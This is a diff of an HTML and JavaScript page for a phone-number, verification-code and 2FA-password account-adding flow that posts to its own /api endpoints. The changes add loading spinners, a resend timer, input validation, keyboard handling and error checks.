@@ -125,6 +125,12 @@
             border-left: 4px solid #2e7d32;
         }
         
+        .info-message {
+            background: #e3f2fd;
+            color: #01579b;
+            border-left: 4px solid #0088cc;
+        }
+        
         .link {
             text-align: center;
             margin-top: 15px;
@@ -139,6 +145,28 @@
         .link a:hover {
             text-decoration: underline;
         }
+
+        .loading-spinner {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255,255,255,.3);
+            border-radius: 50%;
+            border-top-color: #fff;
+            animation: spin 1s ease-in-out infinite;
+            margin-right: 8px;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .btn-content {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
     </style>
 </head>
 <body>
@@ -152,23 +180,28 @@
         
         <div id="step1">
             <input type="text" id="phone" placeholder="Phone number (+1234567890)" value="+">
-            <button onclick="sendCode()" id="sendBtn">Send Code</button>
+            <button onclick="sendCode()" id="sendBtn">
+                <span class="btn-content">
+                    <span>Send Code</span>
+                </span>
+            </button>
         </div>
         
         <div id="step2" style="display: none;">
             <div class="code-inputs">
-                <input type="text" class="code-input" maxlength="1" onkeyup="moveToNext(this, 1)">
-                <input type="text" class="code-input" maxlength="1" onkeyup="moveToNext(this, 2)">
-                <input type="text" class="code-input" maxlength="1" onkeyup="moveToNext(this, 3)">
-                <input type="text" class="code-input" maxlength="1" onkeyup="moveToNext(this, 4)">
-                <input type="text" class="code-input" maxlength="1" onkeyup="moveToNext(this, 5)">
+                <input type="text" class="code-input" maxlength="1" onkeyup="moveToNext(this, 0)" onkeydown="handleKeyDown(event, this, 0)">
+                <input type="text" class="code-input" maxlength="1" onkeyup="moveToNext(this, 1)" onkeydown="handleKeyDown(event, this, 1)">
+                <input type="text" class="code-input" maxlength="1" onkeyup="moveToNext(this, 2)" onkeydown="handleKeyDown(event, this, 2)">
+                <input type="text" class="code-input" maxlength="1" onkeyup="moveToNext(this, 3)" onkeydown="handleKeyDown(event, this, 3)">
+                <input type="text" class="code-input" maxlength="1" onkeyup="moveToNext(this, 4)" onkeydown="handleKeyDown(event, this, 4)">
             </div>
             <button onclick="verifyCode()" id="verifyBtn">Verify Code</button>
             <button onclick="backToPhone()" style="background: #666;">Back</button>
+            <div id="resendTimer" style="text-align: center; margin-top: 10px; font-size: 14px; color: #666;"></div>
         </div>
         
         <div id="step3" style="display: none;">
-            <input type="password" id="password" placeholder="2FA Password">
+            <input type="password" id="password" placeholder="2FA Password" onkeypress="if(event.key==='Enter') verifyPassword()">
             <button onclick="verifyPassword()" id="passwordBtn">Submit</button>
             <button onclick="backToPhone()" style="background: #666;">Cancel</button>
         </div>
@@ -183,11 +216,24 @@
     <script>
         let sessionId = null;
         let phoneNumber = null;
+        let resendTimer = null;
+        let resendSeconds = 30;
         
         function showMessage(text, type) {
             const msgDiv = document.getElementById('message');
             msgDiv.textContent = text;
             msgDiv.className = type;
+        }
+        
+        function setButtonLoading(buttonId, isLoading, text) {
+            const btn = document.getElementById(buttonId);
+            if (isLoading) {
+                btn.disabled = true;
+                btn.innerHTML = '<span class="btn-content"><span class="loading-spinner"></span><span>' + text + '</span></span>';
+            } else {
+                btn.disabled = false;
+                btn.innerHTML = '<span class="btn-content"><span>' + text + '</span></span>';
+            }
         }
         
         function sendCode() {
@@ -197,19 +243,29 @@
                 return;
             }
             
-            phoneNumber = phone;
-            document.getElementById('sendBtn').disabled = true;
-            showMessage('Sending code...', 'info');
+            // Basic phone validation
+            if (!phone.match(/^\+[\d]{10,15}$/)) {
+                showMessage('Please enter phone number with country code (e.g., +1234567890)', 'error');
+                return;
+            }
             
-            // CHANGED: Using /api/add-account instead of /api/send-otp
+            phoneNumber = phone;
+            setButtonLoading('sendBtn', true, 'Sending...');
+            showMessage('Sending code...', 'info-message');
+            
             fetch('/api/add-account', {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({phone: phone})
             })
-            .then(res => res.json())
+            .then(res => {
+                if (!res.ok) {
+                    throw new Error(`HTTP error! status: ${res.status}`);
+                }
+                return res.json();
+            })
             .then(data => {
-                document.getElementById('sendBtn').disabled = false;
+                setButtonLoading('sendBtn', false, 'Send Code');
                 
                 if (data.success) {
                     sessionId = data.session_id;
@@ -219,20 +275,80 @@
                     
                     // Focus first input
                     document.querySelector('.code-input').focus();
+                    
+                    // Start resend timer
+                    startResendTimer();
                 } else {
                     showMessage(data.error || 'Failed to send code', 'error');
                 }
             })
             .catch(err => {
-                document.getElementById('sendBtn').disabled = false;
+                setButtonLoading('sendBtn', false, 'Send Code');
                 showMessage('Network error: ' + err.message, 'error');
-                console.error(err);
+                console.error('Error details:', err);
+            });
+        }
+        
+        function startResendTimer() {
+            resendSeconds = 30;
+            const timerDiv = document.getElementById('resendTimer');
+            
+            if (resendTimer) clearInterval(resendTimer);
+            
+            resendTimer = setInterval(() => {
+                resendSeconds--;
+                if (resendSeconds <= 0) {
+                    clearInterval(resendTimer);
+                    timerDiv.innerHTML = '<a href="#" onclick="resendCode(); return false;" style="color: #0088cc;">Resend code</a>';
+                } else {
+                    timerDiv.textContent = `Resend code in ${resendSeconds}s`;
+                }
+            }, 1000);
+        }
+        
+        function resendCode() {
+            if (!phoneNumber) {
+                backToPhone();
+                return;
+            }
+            
+            setButtonLoading('sendBtn', true, 'Resending...');
+            
+            fetch('/api/add-account', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({phone: phoneNumber})
+            })
+            .then(res => res.json())
+            .then(data => {
+                setButtonLoading('sendBtn', false, 'Send Code');
+                
+                if (data.success) {
+                    sessionId = data.session_id;
+                    showMessage('Code resent successfully', 'success');
+                    startResendTimer();
+                    
+                    // Clear code inputs
+                    document.querySelectorAll('.code-input').forEach(input => {
+                        input.value = '';
+                    });
+                    document.querySelector('.code-input').focus();
+                } else {
+                    showMessage(data.error || 'Failed to resend code', 'error');
+                }
+            })
+            .catch(err => {
+                setButtonLoading('sendBtn', false, 'Send Code');
+                showMessage('Network error: ' + err.message, 'error');
             });
         }
         
         function moveToNext(input, index) {
+            // Allow only numbers
+            input.value = input.value.replace(/[^0-9]/g, '');
+            
             if (input.value.length === 1) {
-                const next = document.querySelector(`.code-input:nth-child(${index + 1})`);
+                const next = document.querySelectorAll('.code-input')[index + 1];
                 if (next) next.focus();
             }
             
@@ -241,6 +357,17 @@
             const allFilled = Array.from(inputs).every(i => i.value.length === 1);
             if (allFilled) {
                 verifyCode();
+            }
+        }
+        
+        function handleKeyDown(event, input, index) {
+            // Handle backspace
+            if (event.key === 'Backspace' && !input.value) {
+                const prev = document.querySelectorAll('.code-input')[index - 1];
+                if (prev) {
+                    prev.focus();
+                    prev.value = '';
+                }
             }
         }
         
@@ -253,10 +380,9 @@
                 return;
             }
             
-            document.getElementById('verifyBtn').disabled = true;
-            showMessage('Verifying...', 'info');
+            setButtonLoading('verifyBtn', true, 'Verifying...');
+            showMessage('Verifying code...', 'info-message');
             
-            // CHANGED: Using /api/verify-code instead of /api/verify-otp
             fetch('/api/verify-code', {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
@@ -265,9 +391,14 @@
                     code: code
                 })
             })
-            .then(res => res.json())
+            .then(res => {
+                if (!res.ok) {
+                    throw new Error(`HTTP error! status: ${res.status}`);
+                }
+                return res.json();
+            })
             .then(data => {
-                document.getElementById('verifyBtn').disabled = false;
+                setButtonLoading('verifyBtn', false, 'Verify Code');
                 
                 if (data.success) {
                     showMessage('✅ Account added successfully!', 'success');
@@ -278,14 +409,18 @@
                     document.getElementById('step2').style.display = 'none';
                     document.getElementById('step3').style.display = 'block';
                     document.getElementById('message').textContent = '';
+                    document.getElementById('password').focus();
                 } else {
                     showMessage(data.error || 'Verification failed', 'error');
+                    // Clear code inputs on error
+                    inputs.forEach(input => input.value = '');
+                    inputs[0].focus();
                 }
             })
             .catch(err => {
-                document.getElementById('verifyBtn').disabled = false;
+                setButtonLoading('verifyBtn', false, 'Verify Code');
                 showMessage('Network error: ' + err.message, 'error');
-                console.error(err);
+                console.error('Error details:', err);
             });
         }
         
@@ -297,20 +432,24 @@
                 return;
             }
             
-            document.getElementById('passwordBtn').disabled = true;
+            setButtonLoading('passwordBtn', true, 'Verifying...');
             
             fetch('/api/verify-code', {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({
                     session_id: sessionId,
-                    code: '',
                     password: password
                 })
             })
-            .then(res => res.json())
+            .then(res => {
+                if (!res.ok) {
+                    throw new Error(`HTTP error! status: ${res.status}`);
+                }
+                return res.json();
+            })
             .then(data => {
-                document.getElementById('passwordBtn').disabled = false;
+                setButtonLoading('passwordBtn', false, 'Submit');
                 
                 if (data.success) {
                     showMessage('✅ Account added successfully!', 'success');
@@ -322,9 +461,9 @@
                 }
             })
             .catch(err => {
-                document.getElementById('passwordBtn').disabled = false;
+                setButtonLoading('passwordBtn', false, 'Submit');
                 showMessage('Network error: ' + err.message, 'error');
-                console.error(err);
+                console.error('Error details:', err);
             });
         }
         
@@ -339,7 +478,27 @@
             document.querySelectorAll('.code-input').forEach(input => {
                 input.value = '';
             });
+            
+            // Clear password
+            document.getElementById('password').value = '';
+            
+            // Clear timer
+            if (resendTimer) {
+                clearInterval(resendTimer);
+                document.getElementById('resendTimer').textContent = '';
+            }
         }
+
+        // Auto-focus first input when step2 shows
+        const observer = new MutationObserver((mutations) => {
+            mutations.forEach((mutation) => {
+                if (mutation.target.style.display === 'block' && mutation.target.id === 'step2') {
+                    document.querySelector('.code-input').focus();
+                }
+            });
+        });
+
+        observer.observe(document.getElementById('step2'), { attributes: true, attributeFilter: ['style'] });
     </script>
 </body>
 </html>
